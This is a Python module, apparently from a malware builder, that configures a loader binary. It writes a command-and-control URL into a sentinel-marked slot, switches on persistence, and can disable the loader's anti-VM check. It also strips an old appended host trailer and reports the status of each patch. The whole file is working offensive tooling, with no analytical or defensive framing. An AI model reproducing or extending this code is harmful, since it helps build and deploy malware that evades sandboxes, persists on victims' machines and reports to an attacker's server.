# cklog/stage.py -- strict loader patching shared by the producer entrypoints.
import struct

from . import pe

MAGIC = b"CKLG"
C2_SENTINEL = b"CKC2_DEADBEEF_"
PERSIST_SENTINEL = b"CKPR____"
PERSIST_ENABLE = b"CKPR0001"
AV_SENTINEL = b"CKAV0000"
AV_DISABLE = b"CKAV0001"


def _c2_slot(blob):
    """Return the single writable, zero-padded C2 array, or None if ambiguous."""
    candidates = []
    offset = blob.find(C2_SENTINEL)
    while offset != -1:
        end = offset + 256
        if (end <= len(blob) and pe.section_of(blob, offset) != ".text" and
                blob[offset + len(C2_SENTINEL):end] ==
                b"\0" * (256 - len(C2_SENTINEL))):
            candidates.append(offset)
        offset = blob.find(C2_SENTINEL, offset + 1)
    return candidates[0] if len(candidates) == 1 else None


def patch_loader(loader_bytes, c2_url, persist=False, no_anti_vm=False):
    """Strip an old host trailer and patch requested loader options.

    Returns (bytes, status). Option statuses are "patched", "skipped", or
    "failed"; status["ok"] is false and status["errors"] explains every failed
    request. No caller should stage the returned bytes when status["ok"] is
    false. In particular, an already-patched slot is never patched a second
    time through its remaining comparison literal.
    """
    idx = loader_bytes.rfind(MAGIC)
    if idx == len(loader_bytes) - 4 and idx >= 8:
        old_len = struct.unpack_from("<I", loader_bytes, idx - 4)[0]
        host_start = idx - 4 - old_len
        if old_len > 0 and host_start >= 0:
            loader_bytes = loader_bytes[:host_start]

    status = {"c2": "skipped", "persist": "skipped", "anti_vm": "skipped",
              "errors": [], "ok": True}

    if c2_url:
        url_bytes = c2_url.encode("utf-8")
        offset = _c2_slot(loader_bytes) if len(url_bytes) <= 255 else None
        if len(url_bytes) > 255:
            status["c2"] = "failed"
            status["errors"].append("C2 patch failed: URL exceeds 255 UTF-8 bytes")
        elif offset is None:
            status["c2"] = "failed"
            status["errors"].append(
                "C2 patch failed: expected exactly one writable, unpatched 256-byte slot")
        else:
            padded = url_bytes + b"\0" * (256 - len(url_bytes))
            loader_bytes = (loader_bytes[:offset] + padded +
                            loader_bytes[offset + 256:])
            status["c2"] = "patched"

    for requested, key, sentinel, replacement, label in (
            (persist, "persist", PERSIST_SENTINEL, PERSIST_ENABLE, "persistence"),
            (no_anti_vm, "anti_vm", AV_SENTINEL, AV_DISABLE, "anti-VM disable")):
        if not requested:
            continue
        offset = -1 if replacement in loader_bytes else pe.patch_ready(
            loader_bytes, sentinel, len(replacement))
        if offset < 0 or loader_bytes[offset:offset + len(sentinel)] != sentinel:
            status[key] = "failed"
            status["errors"].append(
                "%s patch failed: writable unpatched sentinel not found" % label)
            continue
        loader_bytes = (loader_bytes[:offset] + replacement +
                        loader_bytes[offset + len(replacement):])
        status[key] = "patched"

    status["ok"] = not status["errors"]
    return loader_bytes, status
